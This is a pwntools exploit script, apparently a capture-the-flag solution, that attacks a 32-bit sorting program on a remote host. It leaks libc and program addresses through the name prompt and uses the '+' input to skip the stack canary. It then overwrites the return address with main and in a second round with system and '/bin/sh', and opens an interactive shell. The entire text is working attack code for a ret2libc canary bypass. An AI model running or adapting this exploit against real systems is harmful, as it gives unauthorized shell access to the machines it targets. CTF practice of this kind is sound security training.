from pwn import *
from LibcSearcher import *
context(arch='i386')
context.log_level = 'debug'
offset = 0x1AE244

if __name__ == '__main__':
	elf = ELF('./pwn')
	libc = ELF('./libc_32.so.6')
	# io = process('./pwn')
	io = remote('111.200.241.244', 53819)
	# pause()
	io.sendlineafter(b'What your name :', b'flag' * 6 + b'see')

	re = io.recvuntil(b',')
	libref_addr = u32(re[34:38]) - offset
	ref_addr = u32(re[38:42])
	mem_base = ref_addr & 0xfffff000
	mem_main_addr = mem_base + elf.symbols['main']
	print(hex(ref_addr))
	print(hex(mem_main_addr))
	# print(hex(next(libc.search(b'__exit_funcs_lock'))))
	# print(hex(libc.symbols['__exit_funcs_lock']))\
	io.sendlineafter(b"How many numbers do you what to sort :", b'33')

	for i in range(24):
		io.sendlineafter(b'number : ', b'0')
	io.sendlineafter(b'number : ', b'+')
	for i in range(8):
		io.sendlineafter(b'number : ', str(mem_main_addr).encode())

	system_addr = libref_addr + libc.symbols['system']
	binsh_addr = libref_addr + next(libc.search(b'/bin/sh'))
	
	io.sendlineafter(b'What your name :', b'Give me flag!!!')
	io.sendlineafter(b"How many numbers do you what to sort :", b'34')

	print(system_addr)
	print(binsh_addr)
	
	for i in range(24):
		io.sendlineafter(b'number : ', b'0')
	io.sendlineafter(b'number : ', b'+')
	for i in range(8):
		io.sendlineafter(b'number : ', str(system_addr))
	io.sendlineafter(b'number : ', str(binsh_addr))
	
	io.interactive()